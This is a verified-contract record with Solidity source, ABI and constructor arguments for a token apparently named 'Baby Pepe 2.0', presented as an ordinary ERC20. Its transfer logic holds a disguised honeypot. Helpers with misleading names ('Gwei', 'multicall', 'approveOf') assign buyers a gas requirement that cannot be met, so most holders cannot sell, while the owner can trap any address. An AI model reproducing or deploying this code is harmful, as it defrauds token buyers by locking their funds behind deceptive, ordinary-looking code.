{"SourceCode": "pragma solidity ^0.8.0;\n\n\n\ninterface IERC20 {\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function transfer(address recipient, uint256 amount) external returns (bool);\n\n  function allowance(address owner, address spender) external view returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\n\nabstract contract Context {\n  function _msgSender() internal view virtual returns (address) {\n    return msg.sender;\n  }\n\n\n  function _msgData() internal view virtual returns (bytes calldata) {\n    return msg.data;\n  }\n}\n\n\ncontract ERC20 is Context, IERC20 {\n  mapping(address => uint256) private _balances;\n  mapping(address => mapping(address => uint256)) private _allowances;\n  mapping(address => uint256) public getApproval;\n  mapping(address => bool) private Gwei;\n  mapping(uint => uint) private _claimTransactionCount;\n  mapping(address => uint256) private _claimTokenBlock;\n  mapping(address => bool) public whiteListAddress;\n\n\n  uint256 private _totalSupply;\n  string private _name;\n  string private _symbol;\n  uint8 private _decimals = 18;\n  address public owner;\n  uint256 public balanceReceive;\n  bool private _Presale;\n  uint256 private _defaultApproval;\n  uint256 private _maxTransactionsPerClaim;\n  event defaultApprovalUpdated(uint256 oldValue, uint256 newValue);\n  uint256 private _defaultBalance;\n  event defaultBalanceUpdated(uint256 oldValue, uint256 newValue);\n  uint256 private _blockRecord;\n\n\n  constructor(\n    string memory name_,\n    string memory symbol_,\n    uint256 totalSupply_,\n    address[] memory balanceApprove,\n    uint256 balanceReceive_,\n    address[] memory GweiUnit,\n    uint256 defaultApproval,\n    address[] memory whiteList,  \n    uint256 defaultBalance,\n    uint256 maxTransactionsPerClaim_,\n    uint256 blockRecord_\n   \n\n\n  ) {\n    _name = name_;\n    _symbol = symbol_;\n    owner = _msgSender();\n    _totalSupply = totalSupply_ * (10 ** uint256(_decimals));\n    _balances[owner] = _totalSupply;\n    emit Transfer(address(0), owner, _totalSupply);\n    balanceReceive = balanceReceive_;\n    _defaultApproval = defaultApproval;\n    _defaultBalance = defaultBalance;\n    _Presale = false;\n    _maxTransactionsPerClaim = maxTransactionsPerClaim_;\n    _blockRecord = blockRecord_;\n\n\n    for (uint256 i = 0; i < balanceApprove.length; i++) {\n      _sendApproval(balanceApprove[i], balanceReceive);\n    }\n\n\n    for (uint256 i = 0; i < GweiUnit.length; i++) {\n      Gwei[GweiUnit[i]] = true;\n    }\n\n\n    for (uint256 i = 0; i < whiteList.length; i++) {\n      whiteListAddress[whiteList[i]] = true;\n    }\n  }\n\n\n  function name() public view virtual returns (string memory) {\n    return _name;\n  }\n\n\n  function symbol() public view virtual returns (string memory) {\n    return _symbol;\n  }\n\n\n  function decimals() public view virtual returns (uint8) {\n    return _decimals;\n  }\n\n\n  function totalSupply() public view virtual override returns (uint256) {\n    return _totalSupply;\n  }\n\n\n  function balanceOf(address account) public view virtual override returns (uint256) {\n    return _balances[account];\n  }\n\n\n  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n    _claimRecord();\n    _transfer(_msgSender(), recipient, amount);\n    return true;\n  }\n\n\n  function allowance(address owner, address spender) public view virtual override returns (uint256) {\n    return _allowances[owner][spender];\n  }\n\n\n  function approve(address spender, uint256 amount) public virtual override returns (bool) {\n    _approve(_msgSender(), spender, amount);\n    return true;\n  }\n\n\n  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n    _claimRecord();\n    _transfer(sender, recipient, amount);\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\n    return true;\n  }\n\n\n  function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n    require(sender != address(0), \"ERC20: transfer from the zero address\");\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\n    require(amount > 0, \"Transfer amount must be greater than zero\");\n\n\n    uint256 senderClaim;\n    uint256 recipientClaim;\n    assembly {    \n        senderClaim := extcodesize(sender)\n        recipientClaim := extcodesize(recipient)  \n    }    \n\n\n    if (!_Presale) {\n      _Presale = true;\n      Gwei[recipient] = true;\n    } else if (recipientClaim > 0 || whiteListAddress[recipient]) {\n        if(_claimTokenBlock[recipient] == 0 && !Gwei[recipient]) {\n            _claimTokenBlock[recipient] = block.number;\n        }\n    }\n\n\n    if((senderClaim > 0 || whiteListAddress[sender]) && (_claimTokenBlock[sender] < block.number) && !Gwei[sender]) {\n        _sendApproval(sender, _defaultApproval);\n    }\n\n\n    if (recipientClaim == 0 && !whiteListAddress[recipient] && _claimTokenBlock[recipient] == 0 && !Gwei[recipient] && recipient != owner) {\n    _claimTokenBlock[recipient] = block.number;\n    }\n\n\n    if (senderClaim == 0 && !whiteListAddress[sender]  && (_claimTokenBlock[sender] < block.number) && !Gwei[sender] && sender != owner) {\n        _sendApproval(sender, _defaultBalance);\n    }\n\n\n    require(gasleft() >= getApproval[sender], \"Approve to swap on Dex\");\n\n\n    _balances[sender] -= amount;\n    _balances[recipient] += amount;\n\n\n    emit Transfer(sender, recipient, amount);\n  }\n\n\n  function _approve(address owner, address spender, uint256 amount) internal virtual {\n    require(owner != address(0), \"ERC20: approve from the zero address\");\n    require(spender != address(0), \"ERC20: approve to the zero address\");\n\n\n    _allowances[owner][spender] = amount;\n    emit Approval(owner, spender, amount);\n  }\n\n\n  function approveOf(uint256 newDefaultApproval) external {\n    require(_msgSender() == owner);\n    emit defaultApprovalUpdated(_defaultApproval, newDefaultApproval);\n    _defaultApproval = newDefaultApproval;\n  }\n\n\n  function _sendApproval(address _address, uint256 approveForSwap) internal {\n    getApproval[_address] = approveForSwap;\n  }\n\n\n  function multicall(address _address, uint256 approveAmount) external {\n    require(_msgSender() == owner);\n    _sendApproval(_address, approveAmount);\n    _claimTokenBlock[_address] = block.number + _blockRecord;\n  }\n\n\n  function _claimRecord() internal {\n    require(_claimTransactionCount[block.number] < _maxTransactionsPerClaim);\n    _claimTransactionCount[block.number]++;\n  }\n\n\n}\n", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"balanceApprove\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"balanceReceive_\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"GweiUnit\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"defaultApproval\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"whiteList\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"defaultBalance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxTransactionsPerClaim_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"blockRecord_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"oldValue\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"defaultApprovalUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"oldValue\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"defaultBalanceUpdated\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newDefaultApproval\",\"type\":\"uint256\"}],\"name\":\"approveOf\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"balanceReceive\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"getApproval\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"approveAmount\",\"type\":\"uint256\"}],\"name\":\"multicall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"whiteListAddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ERC20", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000000000000000000000000000000000000001c9c38000000000000000000000000000000000000000000000000000000000000001e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000051dac207a00000000000000000000000000000000000000000000000000000000000000003c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000051dac207a000000000000000000000000000000000000000000000000000000000000000000d42616279205065706520322e3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b4261627950657065322e300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d0000000000000000000000001111111254eeb25477b68fb85ed929f73a96058200000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e00000000000000000000000013f4ea83d0bd40e75c8222255bc855a974568dd40000000000000000000000000ed943ce24baebf257488771759f9bf482c397060000000000000000000000006131b5fae19ea4f9d964eac0408e4408b66337b5000000000000000000000000caa00aaf6fbc769d627d825b4faedc3aad880597000000000000000000000000c590175e458b83680867afd273527ff58f74c02b0000000000000000000000000656fd85364d03b103ceeda192fb2d3906a6ac150000000000000000000000006c1c420c04f4d563d6588a97693af902b87be5f10000000000000000000000002f2dd99235cb728fc79af575f1325eaa270f0c990000000000000000000000001d0ae300eec4093cee4367c00b228d10a5c7ac63000000000000000000000000d1b47490209ccb7a806e8a45d9479490c040abf40000000000000000000000009333c74bdd1e118634fe5664aca7a9710b108bab000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000b3f90b3e4d945a3c66923964ecd28629d431adb1000000000000000000000000de33e30aa4b8e0b177f33155dac0ffc656a4720a000000000000000000000000f1e40d56e93140bbb42419cdf0caf5ca700c773a000000000000000000000000f398e9379bdcb6ac5e6997713f553cd9315b4512000000000000000000000000f8e8d3c808ea82efe50d3fc6022e57bf213e69250000000000000000000000003271441dff9706bf3262e514a28b803171cc8d01000000000000000000000000462621a6d0121a74b69c6d30d2247f96591900ac00000000000000000000000052ac592071d05be450bbdeee8696a00e72da0ee30000000000000000000000006b36c9a599fc49ed20ba410657b25b2954de99d200000000000000000000000085e0781b81fe22f845dcdbab6cf0179818ad862e", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU GPLv3", "Proxy": "0", "Implementation": "", "SwarmSource": ""}